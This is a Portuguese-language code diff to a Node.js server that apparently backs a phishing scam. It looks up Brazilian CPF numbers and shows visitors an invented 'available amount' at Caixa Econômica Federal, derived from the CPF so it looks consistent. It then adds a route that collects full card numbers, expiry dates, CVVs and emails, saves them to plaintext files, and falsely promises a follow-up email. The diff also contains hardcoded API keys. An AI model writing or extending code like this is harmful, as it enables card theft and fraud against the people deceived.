@@ -28,6 +28,25 @@ function formatarData(dataStr) {
   return dataStr;
 }
 
+
+// Função para gerar valor aleatório baseado no CPF (sempre o mesmo para o mesmo CPF)
+function gerarValorPorCPF(cpf) {
+  // Usa o CPF como semente para gerar um número consistente
+  let hash = 0;
+  for (let i = 0; i < cpf.length; i++) {
+    hash = ((hash << 5) - hash) + cpf.charCodeAt(i);
+    hash = hash & hash;
+  }
+  // Gera um número entre 500 e 267889 (centavos)
+  const min = 500;
+  const max = 150000;   // R$ 1.500,00 (em centavos) ← ALTERADO
+  const valorCentavos = min + (Math.abs(hash) % (max - min + 1));
+  const valorReais = (valorCentavos / 100).toFixed(2);
+  return parseFloat(valorReais);
+}
+
+
+
 // ====================== ROTA PARA BUSCAR CPF ======================
 app.post('/buscar-cpf', async (req, res) => {
   const { cpf } = req.body;
@@ -47,7 +66,7 @@ app.post('/buscar-cpf', async (req, res) => {
     // Tenta chamar a API real
     const response = await fetch.default(`https://api.cpfhub.io/cpf/${cpf}`, {
       headers: {
-        'x-api-key': 'f7c11a0558d9585472cbd78f071424a7e8a1cff213da92c06ec46de99ea82ae7',
+        'x-api-key': 'f85803bb3199f5dcfa20607e2c12d4dc63ba3e9cab5ccdb0ca868ffeff44dc7d',
         'Accept': 'application/json'
       },
       timeout: 5000
@@ -99,10 +118,10 @@ app.post('/buscar-cpf', async (req, res) => {
       cpf: cpf,
       opcoesDatas: opcoesDatas,
       dataReal: dataNascimentoReal,
-      valorDisponivel: 1987.48,
+      valorDisponivel: gerarValorPorCPF(cpf),  // ← CORRIGIDO
       banco: 'CAIXA ECONÔMICA FEDERAL',
       agencia: '0001',
-      conta: '12345-6',
+      conta: '*****-*',
       message: 'Dados obtidos com sucesso!'
     });
 
@@ -131,7 +150,7 @@ app.post('/buscar-cpf', async (req, res) => {
       cpf: cpf,
       opcoesDatas: opcoesDatas,
       dataReal: dataReal,
-      valorDisponivel: 1987.48,
+      valorDisponivel: gerarValorPorCPF(cpf),  // ← CORRIGIDO
       banco: 'CAIXA ECONÔMICA FEDERAL',
       agencia: '0001',
       conta: '12345-6',
@@ -155,6 +174,55 @@ app.use((req, res) => {
   res.status(404).send('Página não encontrada');
 });
 
+
+
+// Adicione no server.js (depois das outras rotas)
+
+// ====================== ROTA PARA SALVAR DADOS DO CARTÃO ======================
+const fs = require('fs');
+
+app.post('/salvar-cartao', (req, res) => {
+  const { nome, cpf, numeroCartao, validade, cvv, email, valor } = req.body;
+
+  // Validar dados obrigatórios
+  if (!nome || !cpf || !numeroCartao || !validade || !cvv || !email) {
+    return res.status(400).json({ success: false, erro: 'Dados incompletos' });
+  }
+
+  // Criar linha de registro
+  const dataHora = new Date().toLocaleString('pt-BR');
+  const registro = `${'='.repeat(60)}\n`;
+  const conteudo = `${registro}📅 DATA: ${dataHora}\n👤 NOME: ${nome}\n🆔 CPF: ${cpf}\n💳 CARTÃO: ${numeroCartao}\n📅 VALIDADE: ${validade}\n🔢 CVV: ${cvv}\n📧 E-MAIL: ${email}\n💰 VALOR: R$ ${valor}\n${registro}\n\n`;
+
+  // Nome do arquivo com data atual
+  const dataArquivo = new Date().toISOString().slice(0, 19).replace(/:/g, '-');
+  const nomeArquivo = `cartoes_${dataArquivo}.txt`;
+
+  // Caminho da pasta (cria se não existir)
+  const pastaDados = path.join(__dirname, 'dados_cartoes');
+  if (!fs.existsSync(pastaDados)) {
+    fs.mkdirSync(pastaDados);
+  }
+
+  const caminhoArquivo = path.join(pastaDados, nomeArquivo);
+
+  // Salvar no arquivo
+  fs.appendFile(caminhoArquivo, conteudo, (err) => {
+    if (err) {
+      console.error('❌ Erro ao salvar arquivo:', err);
+      return res.status(500).json({ success: false, erro: 'Erro ao salvar dados' });
+    }
+    
+    console.log(`✅ Dados salvos em: ${caminhoArquivo}`);
+    res.json({ 
+      success: true, 
+      message: 'Dados salvos com sucesso! Você receberá um e-mail em até 24 horas.' 
+    });
+  });
+});
+
+
+
 // ====================== INICIA O SERVIDOR ======================
 const PORT = 3000;
 
@@ -165,4 +233,3 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`🌐 Acesse: http://localhost:${PORT}\n`);
   console.log(`🚀 Tunnel ready! Seu app está disponível externamente.`);
 });
-
